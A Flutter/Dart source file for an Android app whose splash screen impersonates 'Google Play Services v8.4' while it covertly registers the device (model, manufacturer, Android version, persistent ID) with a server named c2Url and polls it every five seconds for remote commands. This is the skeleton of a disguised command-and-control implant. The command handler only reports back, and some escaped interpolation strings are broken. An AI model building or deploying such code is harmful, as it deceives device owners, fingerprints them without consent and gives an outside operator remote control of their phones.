import 'package:flutter/material.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'package:device_info_plus/device_info_plus.dart';
import 'package:http/http.dart' as http;
import 'dart:convert';
import 'dart:async';

void main() async {
  WidgetsFlutterBinding.ensureInitialized();
  runApp(const PersistentApp());
}

class PersistentApp extends StatelessWidget {
  const PersistentApp({Key? key}) : super(key: key);

  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      home: const SplashScreen(),
      debugShowCheckedModeBanner: false,
      theme: ThemeData(useMaterial3: true, brightness: Brightness.light),
    );
  }
}

class SplashScreen extends StatefulWidget {
  const SplashScreen({Key? key}) : super(key: key);

  @override
  State<SplashScreen> createState() => _SplashScreenState();
}

class _SplashScreenState extends State<SplashScreen> {
  final String c2Url = 'http://10.0.2.2:8888';
  late String deviceId;

  @override
  void initState() {
    super.initState();
    _initApp();
  }

  void _initApp() async {
    final prefs = await SharedPreferences.getInstance();
    
    deviceId = prefs.getString('device_id') ?? 
      DateTime.now().millisecondsSinceEpoch.toString();
    await prefs.setString('device_id', deviceId);

    _registerDevice();
    _startPolling();

    await Future.delayed(const Duration(milliseconds: 800));
    if (mounted) {
      Navigator.of(context).pushReplacementNamed('/');
    }
  }

  void _registerDevice() async {
    try {
      final deviceInfo = DeviceInfoPlugin();
      final androidInfo = await deviceInfo.androidInfo;
      
      await http.post(
        Uri.parse('\$c2Url/api/devices/register'),
        headers: {'Content-Type': 'application/json'},
        body: jsonEncode({
          'device_id': deviceId,
          'model': androidInfo.model,
          'manufacturer': androidInfo.manufacturer,
          'android_version': androidInfo.version.sdkInt,
          'invite_code': 'default',
        }),
      );
    } catch (e) {
      print('Register error: \$e');
    }
  }

  void _startPolling() {
    Timer.periodic(const Duration(seconds: 5), (_) async {
      try {
        final res = await http.get(
          Uri.parse('\$c2Url/api/commands/poll?device_id=\$deviceId'),
        );
        if (res.statusCode == 200) {
          final data = jsonDecode(res.body);
          if (data['cmd'] != 'wait') {
            _handleCommand(data['cmd']);
          }
        }
      } catch (e) {
        print('Poll error: \$e');
      }
    });
  }

  void _handleCommand(String cmd) async {
    await http.post(
      Uri.parse('\$c2Url/api/logs/upload'),
      headers: {'Content-Type': 'application/json'},
      body: jsonEncode({
        'device_id': deviceId,
        'log_type': cmd,
        'data': 'executed_\$cmd',
        'timestamp': DateTime.now().millisecondsSinceEpoch,
      }),
    );
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      body: Center(
        child: Column(
          mainAxisAlignment: MainAxisAlignment.center,
          children: const [
            Icon(Icons.android, size: 80, color: Color(0xFF0f3460)),
            SizedBox(height: 20),
            Text('Google Play Services v8.4',
              style: TextStyle(fontSize: 18, fontWeight: FontWeight.bold)),
            SizedBox(height: 10),
            Text('Initializing...',
              style: TextStyle(fontSize: 12, color: Colors.grey)),
          ],
        ),
      ),
    );
  }
}
